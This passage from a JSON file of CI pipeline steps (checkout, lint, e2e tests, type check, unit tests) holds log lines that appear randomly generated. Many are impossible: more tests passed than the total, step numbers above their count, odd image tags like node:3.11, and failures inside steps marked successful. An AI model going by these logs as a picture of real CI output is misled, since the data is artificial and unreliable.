          "[12:18:42] DEBUG: Memory usage: 1511MB",
          "\u2713 build completed",
          "Ran 68 tests in 14s",
          "POST /data - 201 (106ms)",
          "\u2713 All checks passed",
          "Coverage: 92% statements, 94% branches",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:18:42] INFO: Request completed",
          "[12:18:42] INFO: Connecting to database",
          "Coverage: 90% statements, 98% branches",
          "\u2717 build failed with exit code 81",
          "Already up to date.",
          "Image pulled successfully",
          "Using Python 3.9",
          "[12:18:42] WARN: Deprecated API usage",
          "pip install: Successfully installed axios-2.20",
          "\u2713 Task completed in 3141ms",
          "npm notice: package.json updated",
          "npm install: resolved 1413 packages",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm notice: created a lockfile",
          "Coverage: 84% statements, 100% branches",
          "GET /health - 201 (12ms)",
          "npm notice: created a lockfile",
          "Verifying...",
          "Layer 8/11: COPY command",
          "Cache restored successfully (298MB)",
          "Compiling components/main.py...",
          "Verifying...",
          "Processing...",
          "POST /api - 200 (190ms)",
          "Building Docker image...",
          "[12:18:42] INFO: Starting build process",
          "Layer 6/15: COPY command",
          "Compiling src/main.py...",
          "Verifying...",
          "Cache restored successfully (313MB)",
          "Test Suites: 18 passed, 13 total",
          "Pushing to registry...",
          "Connecting to example.com:443...",
          "POST /data - 200 (183ms)",
          "[12:18:42] INFO: Connecting to database",
          "Cache hit for key-9746",
          "Processing...",
          "Connection established",
          "Completed.",
          "Completed.",
          "npm notice: created a lockfile",
          "Environment: staging",
          "Finished.",
          "Success!",
          "Test Suites: 40 passed, 18 total",
          "Ready.",
          "Generating source maps...",
          "yarn add: Done in 29.36s",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling lib/index.js...",
          "NODE_ENV=test",
          "Step 16/18: Running migrations",
          "Exception: NullPointerException",
          "[12:18:42] INFO: Processing request",
          "npm install: added 326 packages",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-21T12:19:59.198665",
        "finished_at": "2025-11-21T12:20:04.142334",
        "log_lines": [
          "=== Step: checkout ===",
          "Artifact downloaded: 35MB",
          "Waiting...",
          "Pulling image: node:3.11",
          "[12:18:42] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Switched to branch 'hotfix/task-798'",
          "Coverage: 96% statements, 74% branches",
          "[12:18:42] INFO: Cache refreshed",
          "POST /api - 200 (455ms)",
          "Step 6/21: Deploying",
          "Done.",
          "Image pulled successfully",
          "Connecting to startup.dev:443...",
          "Cache saved successfully",
          "Checking out develop branch",
          "Step 15/19: Running migrations",
          "Artifact downloaded: 9MB",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Test Suites: 18 passed, 25 total",
          "Processing...",
          "Bundling runtime.js",
          "WARNING: webpack has known vulnerabilities",
          "Cache restored successfully (217MB)",
          "Waiting...",
          "Using Node.js 16.16.4",
          "OK",
          "Checking out main branch",
          "Connecting to acme.corp:443...",
          "Done.",
          "npm install: added 51 packages",
          "Compiling components/app.ts...",
          "Step 11/24: Deploying",
          "WARNING: express has known vulnerabilities",
          "Completed.",
          "npm notice: created a lockfile",
          "Compiling components/handler.rs...",
          "FAILED: test_db_connect",
          "npm install: added 289 packages",
          "WARNING: jest has known vulnerabilities",
          "Artifact uploaded: dist.zip (95MB)",
          "\u2713 Task completed in 4639ms",
          "\u2713 Step 'test' succeeded",
          "Ready.",
          "[12:18:42] DEBUG: Query executed in 28ms",
          "WARNING: prettier has known vulnerabilities",
          "WARNING: jest has known vulnerabilities",
          "pip: Collecting eslint",
          "[12:18:42] INFO: Request completed",
          "NODE_ENV=development",
          "Minifying main.js",
          "Installing eslint@4.6.6",
          "npm notice: package.json updated",
          "npm install: resolved 1783 packages",
          "Compiling utils/handler.rs...",
          "\u2713 Task completed in 2828ms",
          "\u2717 build failed with exit code 82",
          "\u2717 build failed with exit code 12",
          "[12:18:42] INFO: Cache refreshed",
          "pip install: Successfully installed eslint-2.6",
          "[12:18:42] ERROR: Connection failed",
          "Done.",
          "Connection established",
          "Ran 75 tests in 5s",
          "NODE_ENV=development",
          "Completed.",
          "Environment: test",
          "Coverage: 80% statements, 94% branches",
          "Tests: 98 passed, 78 total",
          "[12:18:42] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "GET /status - 201 (24ms)",
          "[12:18:42] INFO: Processing request",
          "Switched to branch 'hotfix/task-752'",
          "[12:18:42] DEBUG: Query executed in 99ms",
          "Step 18/15: Running migrations",
          "Checking out master branch",
          "WARNING: lodash has known vulnerabilities",
          "Finished.",
          "Artifact uploaded: dist.zip (80MB)",
          "Cache hit for key-6924",
          "[12:18:42] WARN: Deprecated API usage",
          "  PASS: test_db_connect (202ms)",
          "Artifact downloaded: 32MB",
          "  PASS: test_db_connect (314ms)",
          "[12:18:42] ERROR: Connection failed",
          "Checking out main branch",
          "Layer 6/10: ENV command",
          "pip install: Successfully installed jest-3.19",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: dist.zip (34MB)",
          "[12:18:42] INFO: Request completed",
          "Verifying...",
          "Optimizing 26 modules...",
          "[12:18:42] WARN: Deprecated API usage",
          "Step 3/25: Running migrations",
          "npm notice: created a lockfile",
          "Step 19/24: Testing",
          "[12:18:42] INFO: Cache refreshed",
          "Creating production build...",
          "[12:18:42] WARN: Deprecated API usage",
          "\u2713 build completed",
          "[12:18:42] INFO: Connecting to database",
          "HEAD is now at 6febeaa",
          "Step 8/24: Running migrations",
          "[12:18:42] WARN: Deprecated API usage",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-21T12:20:04.142334",
        "finished_at": "2025-11-21T12:20:16.501507",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "\u2713 test completed",
          "Loading...",
          "Completed.",
          "GET /status - 201 (37ms)",
          "Completed.",
          "pip: Collecting prettier",
          "Step 7/17: Installing dependencies",
          "npm install: resolved 1249 packages",
          "Coverage: 86% statements, 75% branches",
          "[12:18:42] DEBUG: Query executed in 23ms",
          "Layer 8/13: ENV command",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Creating production build...",
          "\u2713 package completed",
          "Finished.",
          "Snapshots: 0 passed, 31 total",
          "FAILED: test_auth_login",
          "Connection established",
          "Finished.",
          "Tests: 305 passed, 193 total",
          "Building Docker image...",
          "Installing prettier@5.9.1",
          "Fetching submodules...",
          "[12:18:42] DEBUG: Memory usage: 1241MB",
          "[12:18:42] DEBUG: Connection pool: 6 active",
          "Cache saved successfully",
          "TLS handshake completed",
          "POST /upload - 200 (154ms)",
          "pip: Collecting prettier",
          "Bundling main.js",
          "Processing...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 1/24: Running migrations",
          "npm install: added 421 packages",
          "Platform: linux-x64",
          "[12:18:42] INFO: Connecting to database",
          "Environment: development",
          "Processing...",
          "[12:18:42] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 95",
          "Waiting...",
          "WARNING: prettier has known vulnerabilities",
          "Generating source maps...",
          "Compiling lib/main.py...",
          "Compiling src/app.ts...",
          "Cache restored successfully (463MB)",
          "Using Python 3.9",
          "Artifact uploaded: dist.zip (56MB)",
          "Compiling lib/app.ts...",
          "  PASS: e2e/test_user_create.spec.js",
          "\u2713 Task completed in 4709ms",
          "Cache restored successfully (209MB)",
          "Finished.",
          "[12:18:42] DEBUG: Loading configuration",
          "Already up to date.",
          "Cache restored successfully (258MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:18:42] INFO: Cache refreshed",
          "Bundling main.js",
          "yarn add: Done in 20.13s",
          "Pushing to registry...",
          "  PASS: test_cache_hit (26ms)",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache restored successfully (368MB)",
          "Already up to date.",
          "Time: 30.199s",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Bundling main.js",
          "npm notice: created a lockfile",
          "pip: Downloading eslint-4.3.tar.gz",
          "Step 14/22: Installing dependencies",
          "Building Docker image...",
          "\u2717 build failed with exit code 56",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact downloaded: 32MB",
          "Building Docker image...",
          "Compiling components/service.java...",
          "HEAD is now at b171806",
          "Installing react@1.11.6",
          "Coverage: 87% statements, 81% branches",
          "Ready.",
          "[12:18:42] ERROR: Connection failed",
          "Waiting...",
          "Checking out main branch",
          "Snapshots: 42 passed, 38 total",
          "pip install: Successfully installed webpack-3.6",
          "[12:18:42] DEBUG: Connection pool: 9 active",
          "\u2717 build failed with exit code 48",
          "Verifying...",
          "POST /upload - 200 (444ms)",
          "Time: 62.374s",
          "Test Suites: 30 passed, 6 total",
          "Platform: linux-x64",
          "Waiting...",
          "Time: 89.437s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "NODE_ENV=development",
          "Tests: 277 passed, 88 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Ready.",
          "[12:18:42] INFO: Starting build process",
          "  PASS: test_api_health (89ms)",
          "Cache invalidated: dependencies",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-21T12:20:16.501507",
        "finished_at": "2025-11-21T12:20:53.579026",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "WARNING: express has known vulnerabilities",
          "Compiling utils/app.ts...",
          "Creating production build...",
          "Fetching submodules...",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/index.js...",
          "[12:18:42] DEBUG: Connection pool: 19 active",
          "[12:18:42] INFO: Connecting to database",
          "  PASS: test_cache_hit (110ms)",
          "Using Node.js 14.12.7",
          "Switched to branch 'bugfix/task-606'",
          "npm install: resolved 898 packages",
          "Verifying...",
          "pip: Collecting eslint",
          "Test Suites: 10 passed, 16 total",
          "Artifact uploaded: dist.zip (68MB)",
          "Cache invalidated: build",
          "pip: Installing build dependencies...",
          "Environment: production",
          "Uploading artifact 'coverage' (18 files)",
          "Artifact uploaded: dist.zip (34MB)",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Step 10/24: Installing dependencies",
          "Artifact downloaded: 28MB",
          "Pulling image: python:18",
          "\u2713 All checks passed",
          "Tests: 187 passed, 443 total",
          "pip: Downloading webpack-2.18.tar.gz",
          "Creating production build...",
          "[12:18:42] INFO: Starting build process",
          "[12:18:42] WARN: Deprecated API usage",
          "[12:18:42] DEBUG: Initializing service",
          "Building Docker image...",
          "Fetching submodules...",
          "\u2713 package completed",
          "Ready.",
          "Already up to date.",
          "Uploading artifact 'coverage' (15 files)",
          "Step 15/20: Running migrations",
          "Pushing to registry...",
          "npm install: added 113 packages",
          "Already up to date.",
          "yarn add: Done in 17.65s",
          "Test Suites: 24 passed, 47 total",
          "[12:18:42] INFO: Cache refreshed",
          "Creating production build...",
          "Layer 7/9: COPY command",
          "Already up to date.",
          "npm notice: package.json updated",
          "Snapshots: 28 passed, 42 total",
          "Snapshots: 21 passed, 14 total",
          "Using Node.js 20.10.4",
          "Minifying vendor.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Downloading react-4.12.tar.gz",
          "Tests: 373 passed, 55 total",
          "WARNING: eslint has known vulnerabilities",
          "Loading...",
          "pip install: Successfully installed prettier-2.17",
          "GET /health - 204 (40ms)",
          "Coverage: 87% statements, 74% branches",
          "Ready.",
          "\u2713 Step 'setup' succeeded",
          "Using Python 3.9",
          "[12:18:42] DEBUG: Initializing service",
          "npm notice: package.json updated",
          "[12:18:42] INFO: Starting build process",
          "Fetching submodules...",
          "Artifact uploaded: dist.zip (2MB)",
          "Tests: 209 passed, 429 total",
          "Building Docker image...",
          "Processing...",
          "WARNING: axios has known vulnerabilities",
          "\u2713 Task completed in 3964ms",
          "Step 11/16: Linting",
          "Installing express@2.3.2",
          "Cache restored successfully (190MB)",
          "Cache restored successfully (267MB)",
          "[12:18:42] WARN: Deprecated API usage",
          "  PASS: integration/test_user_create.spec.js",
          "npm install: added 461 packages",
          "WARNING: jest has known vulnerabilities",
          "Step 20/19: Linting",
          "\u2713 Task completed in 3897ms",
          "Ran 43 tests in 52s",
          "Done.",
          "Compiling lib/service.java...",
          "npm install: added 472 packages",
          "Ran 92 tests in 35s",
          "Checking out main branch",
          "[12:18:42] ERROR: Connection failed",
          "Loading...",
          "Completed.",
          "Already up to date.",
          "WARNING: jest has known vulnerabilities",
          "Environment: staging",
          "Cache invalidated: build",
          "pip install: Successfully installed express-3.16",
          "Coverage: 99% statements, 92% branches",
          "  PASS: test_cache_hit (140ms)",
          "Uploading artifact 'build' (27 files)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_api_health (220ms)",
          "Step 18/18: Building",
          "npm notice: package.json updated",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-21T12:20:53.579026",
        "finished_at": "2025-11-21T12:21:05.938199",
        "log_lines": [
          "=== Step: lint ===",
          "Time: 113.666s",
          "Loading...",
          "Step 13/21: Deploying",
          "[12:18:42] DEBUG: Initializing service",
          "  PASS: test_user_create (394ms)",
          "Verifying...",
          "Cache invalidated: node_modules",
          "Checking out main branch",
          "Cache miss for key-5895",
          "WARNING: express has known vulnerabilities",
          "[12:18:42] INFO: Cache refreshed",
          "TLS handshake completed",
          "WARNING: axios has known vulnerabilities",
          "[12:18:42] INFO: Cache refreshed",
          "pip: Downloading axios-5.0.tar.gz",
          "Tests: 359 passed, 82 total",
          "Exception: RuntimeError",
          "Step 7/25: Testing",
          "Generating source maps...",
          "Uploading artifact 'build' (7 files)",
          "Image pulled successfully",
          "Cache invalidated: node_modules",
          "Uploading artifact 'build' (41 files)",
          "Environment: staging",
          "Step 3/25: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Creating production build...",
          "[12:18:42] ERROR: Connection failed",
          "Waiting...",
          "Exception: ValueError",
          "Done.",
          "Compiling utils/handler.rs...",
          "Minifying main.js",
          "TLS handshake completed",
          "Step 5/19: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Switched to branch 'bugfix/task-987'",
          "Ran 60 tests in 39s",
          "Connecting to cloud.services:443...",
          "Switched to branch 'feature/task-318'",
          "[12:18:42] DEBUG: Connection pool: 14 active",
          "Completed.",
          "Ran 136 tests in 10s",
          "[12:18:42] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Creating production build...",
          "Image pulled successfully",
          "POST /data - 202 (426ms)",
          "[12:18:42] ERROR: Connection failed",
          "\u2713 All checks passed",
          "[12:18:42] INFO: Connecting to database",
          "POST /data - 201 (28ms)",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "[12:18:42] WARN: Deprecated API usage",
          "Completed.",
          "pip: Downloading react-2.11.tar.gz",
          "\u2713 Step 'install' succeeded",
          "\u2717 build failed with exit code 106",
          "\u2713 All checks passed",
          "Time: 19.481s",
          "Checking out main branch",
          "[12:18:42] INFO: Connecting to database",
          "Step 2/23: Deploying",
          "\u2713 All checks passed",
          "[12:18:42] WARN: Deprecated API usage",
          "pip: Collecting jest",
          "Checking out master branch",
          "Installing prettier@4.19.5",
          "Environment: production",
          "Cache saved successfully",
          "Optimizing 13 modules...",
          "WARNING: axios has known vulnerabilities",
          "[12:18:42] INFO: Processing request",
          "Cache invalidated: node_modules",
          "Tests: 258 passed, 340 total",
          "HEAD is now at eedd18e",
          "Processing...",
          "FAILED: test_api_health",
          "Connection established",
          "Verifying...",
          "Step 7/17: Linting",
          "[12:18:42] DEBUG: Loading configuration",
          "Connecting to cloud.services:443...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling utils/app.ts...",
          "Step 8/21: Testing",
          "Tests: 210 passed, 485 total",
          "Image pulled successfully",
          "[12:18:42] INFO: Starting build process",
          "yarn add: Done in 13.83s",
          "Step 6/25: Deploying",
          "Ran 89 tests in 44s",
          "Compiling components/index.js...",
          "pip: Installing build dependencies...",
          "Verifying...",
          "[12:18:42] DEBUG: Loading configuration",
          "[12:18:42] WARN: Deprecated API usage",
          "Connecting to acme.corp:443...",
          "\u2713 Step 'build' succeeded",
          "Cache hit for key-9849",
          "Already up to date.",
          "yarn add: Done in 3.68s",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-21T12:21:05.938199",
        "finished_at": "2025-11-21T12:21:18.297372",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Using Node.js 16.9.0",
          "FAILED: test_db_connect",
          "[12:18:42] INFO: Request completed",
          "Artifact uploaded: dist.zip (54MB)",
          "pip: Collecting lodash",
          "[12:18:42] WARN: Deprecated API usage",
          "WARNING: webpack has known vulnerabilities",
          "Ready.",
          "Checking out main branch",
          "TLS handshake completed",
          "Fetching submodules...",
          "npm install: added 465 packages",
          "Cache miss for key-3463",
          "WARNING: axios has known vulnerabilities",
          "Connecting to acme.corp:443...",
          "Step 10/19: Building",
          "GET /status - 200 (48ms)",
          "[12:18:42] WARN: Deprecated API usage",
          "Already up to date.",
          "Snapshots: 13 passed, 20 total",
          "Already up to date.",
          "Connecting to test.io:443...",
          "Completed.",
          "\u2713 package completed",
          "Compiling utils/app.ts...",
          "Step 9/22: Building",
          "[12:18:42] WARN: Deprecated API usage",
          "Installing prettier@4.16.3",
          "[12:18:42] DEBUG: Memory usage: 547MB",
          "  PASS: test_api_health (246ms)",
          "Connection established",
          "WARNING: jest has known vulnerabilities",
          "Waiting...",
          "[12:18:42] ERROR: Connection failed",
          "Image pulled successfully",
          "[12:18:42] WARN: Deprecated API usage",
          "Compiling components/service.java...",
          "Platform: win32-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling utils/app.ts...",
          "Cache saved successfully",
          "Compiling src/handler.rs...",
          "Test Suites: 32 passed, 46 total",
          "Optimizing 56 modules...",
          "Step 18/15: Testing",
          "Tests: 327 passed, 140 total",
          "HEAD is now at 6069738",
          "Transforming 910 files...",
          "[12:18:42] INFO: Processing request",
          "[12:18:42] DEBUG: Connection pool: 1 active",
          "Artifact uploaded: dist.zip (9MB)",
          "[12:18:42] INFO: Request completed",
          "Finished.",
          "pip: Downloading axios-2.15.tar.gz",
          "HEAD is now at a8b7143",
          "[12:18:42] INFO: Connecting to database",
          "Cache restored successfully (297MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling components/app.ts...",
          "WARNING: jest has known vulnerabilities",
          "\u2713 lint completed",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:18:42] DEBUG: Query executed in 81ms",
          "Step 20/16: Deploying",
          "Generating source maps...",
          "pip: Downloading axios-1.16.tar.gz",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip install: Successfully installed webpack-4.15",
          "Step 14/22: Running migrations",
          "Ready.",
          "Cache saved successfully",
          "Tests: 79 passed, 222 total",
          "npm notice: package.json updated",
          "Compiling lib/app.ts...",
          "Artifact downloaded: 16MB",
          "npm install: resolved 857 packages",
          "Verifying...",
          "Optimizing 91 modules...",
          "Already up to date.",
          "HEAD is now at e299d56",
          "npm notice: created a lockfile",
          "Installing prettier@3.13.0",
          "Ready.",
          "Connection established",
          "Layer 7/14: RUN command",
          "[12:18:42] DEBUG: Query executed in 80ms",
          "Cache miss for key-5650",
          "Switched to branch 'feature/task-721'",
          "[12:18:42] WARN: Deprecated API usage",
          "Cache invalidated: dependencies",
          "Creating production build...",
          "Installing react@4.13.1",
          "WARNING: prettier has known vulnerabilities",
          "npm install: resolved 1204 packages",
          "OK",
          "  PASS: test_cache_hit (439ms)",
          "Installing webpack@1.18.7",
          "Ready.",
          "npm notice: created a lockfile",
          "Cache restored successfully (237MB)",
          "[12:18:42] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Using Node.js 14.15.10",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-21T12:21:18.297372",
        "finished_at": "2025-11-21T12:21:30.656545",
        "log_lines": [
          "=== Step: type_check ===",
          "Building Docker image...",
          "Verifying...",
          "TLS handshake completed",
          "[12:18:42] WARN: Deprecated API usage",
          "Time: 30.913s",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 Task completed in 838ms",
          "[12:18:42] WARN: Deprecated API usage",
          "Checking out master branch",
          "Artifact downloaded: 41MB",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:18:42] INFO: Request completed",
          "pip install: Successfully installed axios-3.0",
          "Coverage: 89% statements, 79% branches",
          "Tests: 174 passed, 122 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Layer 3/13: ENV command",
          "Snapshots: 17 passed, 43 total",
          "Generating source maps...",
          "Cache invalidated: dependencies",
          "Environment: test",
          "[12:18:42] INFO: Starting build process",
          "Compiling src/service.java...",
          "Bundling styles.css",
          "Optimizing 23 modules...",
          "pip: Installing build dependencies...",
          "[12:18:42] DEBUG: Query executed in 3ms",
          "GET /status - 204 (29ms)",
          "Layer 6/8: RUN command",
          "Compiling components/main.py...",
          "Tests: 472 passed, 106 total",
          "Step 18/19: Running migrations",
          "Exception: NullPointerException",
          "Minifying app.js",
          "Step 17/21: Installing dependencies",
          "Bundling runtime.css",
          "npm notice: created a lockfile",
          "Using Python 3.9",
          "Ready.",
          "Step 17/20: Testing",
          "Compiling components/index.js...",
          "WARNING: react has known vulnerabilities",
          "Installing webpack@4.14.3",
          "pip: Installing build dependencies...",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Layer 2/11: COPY command",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling utils/index.js...",
          "[12:18:42] DEBUG: Loading configuration",
          "[12:18:42] INFO: Connecting to database",
          "Platform: win32-x64",
          "Generating source maps...",
          "Compiling lib/handler.rs...",
          "pip install: Successfully installed react-5.14",
          "npm install: resolved 1355 packages",
          "[12:18:42] INFO: Starting build process",
          "Done.",
          "pip install: Successfully installed prettier-4.16",
          "Image pulled successfully",
          "\u2713 test completed",
          "yarn add: Done in 29.77s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 8/17: Building",
          "Using Python 3.12",
          "Processing...",
          "Cache restored successfully (153MB)",
          "Completed.",
          "Step 10/19: Installing dependencies",
          "Cache saved successfully",
          "Environment: development",
          "Connecting to startup.dev:443...",
          "Step 8/17: Building",
          "\u2713 All checks passed",
          "Step 7/19: Running migrations",
          "Pushing to registry...",
          "Finished.",
          "Step 5/19: Deploying",
          "[12:18:42] DEBUG: Connection pool: 8 active",
          "  PASS: integration/test_api_health.spec.js",
          "  PASS: test_api_health (261ms)",
          "Step 9/23: Installing dependencies",
          "HEAD is now at b9085ef",
          "  PASS: e2e/test_user_create.spec.js",
          "Step 18/24: Testing",
          "Pulling image: node:18",
          "Checking out develop branch",
          "Tests: 143 passed, 306 total",
          "Generating source maps...",
          "Completed.",
          "Compiling lib/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 17/23: Testing",
          "[12:18:42] INFO: Request completed",
          "Environment: test",
          "Cache saved successfully",
          "Cache miss for key-3965",
          "pip: Downloading express-3.4.tar.gz",
          "Completed.",
          "[12:18:42] DEBUG: Query executed in 24ms",
          "Connection established",
          "npm install: added 38 packages",
          "[12:18:42] DEBUG: Memory usage: 1429MB",
          "OK",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-21T12:21:30.656545",
        "finished_at": "2025-11-21T12:21:43.015718",
        "log_lines": [
          "=== Step: setup_environment ===",
          "WARNING: eslint has known vulnerabilities",
          "Compiling components/index.js...",
          "Uploading artifact 'dist' (22 files)",
          "Cache miss for key-9929",
          "Cache miss for key-3195",
          "FAILED: test_auth_login",
          "  PASS: unit/test_db_connect.spec.js",
          "Using Node.js 17.11.6",
          "npm install: resolved 199 packages",
          "Cache hit for key-8594",
          "Completed.",
          "  PASS: e2e/test_auth_login.spec.js",
          "HEAD is now at 7e3a176",
          "Compiling utils/app.ts...",
          "Completed.",
          "npm notice: created a lockfile",
          "[12:18:42] INFO: Request completed",
          "Step 17/18: Running migrations",
          "Minifying vendor.js",
          "npm install: resolved 1947 packages",
          "\u2713 Task completed in 4488ms",
          "Ready.",
          "Success!",
          "Switched to branch 'bugfix/task-641'",
          "Loading...",
          "WARNING: eslint has known vulnerabilities",
          "Time: 79.579s",
          "\u2713 Task completed in 4673ms",
          "pip: Installing build dependencies...",
          "yarn add: Done in 7.51s",
          "Checking out master branch",
          "pip install: Successfully installed axios-5.14",
          "[12:18:42] WARN: Deprecated API usage",
          "Installing react@4.13.3",
          "Step 6/22: Testing",
          "Step 14/19: Testing",
          "Creating production build...",
          "Uploading artifact 'dist' (9 files)",
          "[12:18:42] DEBUG: Connection pool: 14 active",
          "  PASS: test_api_health (159ms)",
          "Compiling lib/service.java...",
          "Cache restored successfully (290MB)",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 Step 'checkout' succeeded",
          "Cache saved successfully",
          "npm install: resolved 1794 packages",
          "Compiling src/service.java...",
          "Connecting to acme.corp:443...",
          "Creating production build...",
          "Pulling image: python:3.11",
          "Cache restored successfully (192MB)",
          "Artifact downloaded: 26MB",
          "Uploading artifact 'build' (33 files)",
          "Pulling image: python:3.11",
          "\u2713 Step 'setup' succeeded",
          "pip: Collecting webpack",
          "Pulling image: python:3.11",
          "[12:18:42] DEBUG: Query executed in 43ms",
          "[12:18:42] INFO: Connecting to database",
          "[12:18:42] DEBUG: Connection pool: 20 active",
          "Artifact downloaded: 38MB",
          "[12:18:42] DEBUG: Initializing service",
          "Tests: 176 passed, 247 total",
          "[12:18:42] WARN: Deprecated API usage",
          "Connecting to startup.dev:443...",
          "GET /status - 200 (31ms)",
          "Step 14/22: Testing",
          "Uploading artifact 'coverage' (46 files)",
          "Artifact uploaded: dist.zip (35MB)",
          "[12:18:42] WARN: Deprecated API usage",
          "Done.",
          "Already up to date.",
          "Time: 22.674s",
          "Platform: darwin-arm64",
          "\u2717 build failed with exit code 68",
          "Coverage: 70% statements, 97% branches",
          "Compiling components/main.py...",
          "Step 3/18: Linting",
          "pip: Downloading webpack-5.0.tar.gz",
          "[12:18:42] ERROR: Connection failed",
          "Coverage: 88% statements, 95% branches",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Using Node.js 20.19.7",
          "Image pulled successfully",
          "Step 16/17: Testing",
          "Test Suites: 40 passed, 43 total",
          "Cache invalidated: build",
          "Building Docker image...",
          "[12:18:42] INFO: Processing request",
          "Done.",
          "Cache hit for key-2851",
          "Step 16/24: Deploying",
          "OK",
          "HEAD is now at 65ceec1",
          "Cache miss for key-1114",
          "OK",
          "Verifying...",
          "Loading...",
          "GET /api - 200 (42ms)",
          "[12:18:42] DEBUG: Memory usage: 281MB",
          "GET /health - 201 (28ms)",
          "Connection established",
          "Snapshots: 29 passed, 6 total",
          "WARNING: express has known vulnerabilities",
          "Test Suites: 6 passed, 45 total",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-21T12:21:43.015718",
        "finished_at": "2025-11-21T12:22:20.093237",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Bundling main.js",
          "Cache miss for key-3616",
          "\u2713 Step 'test' succeeded",
          "Cache miss for key-6627",
          "Already up to date.",
          "Coverage: 98% statements, 77% branches",
          "Layer 2/11: ENV command",
          "Step 18/20: Deploying",
          "Processing...",
          "Ran 119 tests in 33s",
          "Optimizing 15 modules...",
          "pip: Downloading axios-4.13.tar.gz",
          "[12:18:42] INFO: Cache refreshed",
          "[12:18:42] DEBUG: Loading configuration",
          "[12:18:42] DEBUG: Loading configuration",
          "OK",
          "[12:18:42] INFO: Connecting to database",
          "Building Docker image...",
          "npm install: added 414 packages",
          "Cache saved successfully",
          "Step 13/17: Linting",
          "FAILED: test_api_health",
          "Time: 92.138s",
          "[12:18:42] INFO: Cache refreshed",
          "Step 5/23: Deploying",
          "npm install: resolved 1835 packages",
          "Image pulled successfully",
          "Bundling main.css",
          "[12:18:42] DEBUG: Query executed in 44ms",
          "Ready.",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 Task completed in 2928ms",
          "Coverage: 89% statements, 60% branches",
          "Processing...",
          "Compiling lib/handler.rs...",
          "GET /status - 200 (9ms)",
          "Cache invalidated: node_modules",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:18:42] DEBUG: Memory usage: 256MB",
          "Processing...",
          "Environment: development",
          "Time: 23.701s",
          "Waiting...",
          "Building Docker image...",
          "Platform: win32-x64",
          "[12:18:42] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 7/25: Linting",
          "HEAD is now at d734e6d",
          "[12:18:42] INFO: Starting build process",
          "Success!",
          "Already up to date.",
          "Cache miss for key-5989",
          "Installing eslint@4.19.1",
          "yarn add: Done in 4.96s",
          "Platform: win32-x64",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-1097",
          "GET /status - 200 (72ms)",
          "npm notice: created a lockfile",
          "\u2713 deploy completed",
          "Pushing to registry...",
          "Using Node.js 20.19.6",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache saved successfully",
